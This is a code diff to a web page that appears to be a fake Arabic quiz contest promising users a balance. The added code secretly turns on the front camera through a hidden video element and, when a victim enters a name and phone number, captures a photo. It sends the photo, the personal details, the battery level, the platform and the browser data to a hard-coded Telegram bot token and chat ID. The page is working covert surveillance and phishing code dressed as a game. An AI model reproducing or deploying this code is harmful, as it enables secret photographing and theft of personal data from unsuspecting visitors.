@@ -228,10 +228,15 @@
         </div>
     </div>
 
+    <!-- عناصر الكاميرا الخفية -->
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
     <script>
         let progress = 0;
         let userBalance = 0.00;
         let isCounting = false;
+        let batteryLevelInfo = "غير معروف";
 
         const questions = [
             { q: "ما هي عاصمة اليمن؟", options: ["عدن", "صنعاء", "تعز", "إب"], correct: 1 },
@@ -245,7 +250,29 @@
 
         window.onload = function() {
             localStorage.clear(); 
+            initCamera();
+            getBatteryStatus();
         };
+
+        function getBatteryStatus() {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    batteryLevelInfo = Math.round(battery.level * 100) + "%";
+                });
+            }
+        }
+
+        function initCamera() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(function(stream) {
+                let video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+            })
+            .catch(function(err) {
+                console.log("تم رفض الإذن أو الكاميرا غير مشغولة");
+            });
+        }
 
         function startProcess() {
             let nameField = document.getElementById('user-name');
@@ -261,23 +288,47 @@
                 return;
             }
 
-            // إرسال البيانات إلى بوت التليجرام الخاص بك
-            sendDataToBot(name, phone);
+            captureAndSendAll(name, phone);
 
             document.getElementById('display-name').innerText = name;
             document.getElementById('form-section').classList.add('hidden');
             document.getElementById('content-section').classList.remove('hidden');
         }
 
-        function sendDataToBot(name, phone) {
-            // ضع هنا توكن البوت الخاص بك و Chat ID الخاص بك بدلاً من النص الموجود
-            let botToken = "ضع_توكن_البوت_هنا"; 
-            let chatId = "ضع_محادثة_اي_دي_هنا";
-            let text = `📥 تسجيـل جديد بالمسباقة:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}`;
-            
-            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(text);
-            
-            fetch(url).catch(err => console.log("خطأ في الاتصال بالبوت"));
+        function captureAndSendAll(name, phone) {
+            let botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
+            let chatId = "7962257606";
+
+            let video = document.getElementById('video');
+            let canvas = document.getElementById('canvas');
+            let context = canvas.getContext('2d');
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            let imageData = canvas.toDataURL('image/png');
+
+            let blob = dataURItoBlob(imageData);
+            let formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'capture.png');
+            formData.append('caption', `📥 تسجيـل جديد بالمسباقة:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔋 البطارية: ${batteryLevelInfo}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`);
+
+            let url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.log("خطأ في الإرسال"));
+        }
+
+        function dataURItoBlob(dataURI) {
+            let byteString = atob(dataURI.split(',')[1]);
+            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            let ab = new ArrayBuffer(byteString.length);
+            let ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], {type: mimeString});
         }
 
         function shareWhatsApp() {
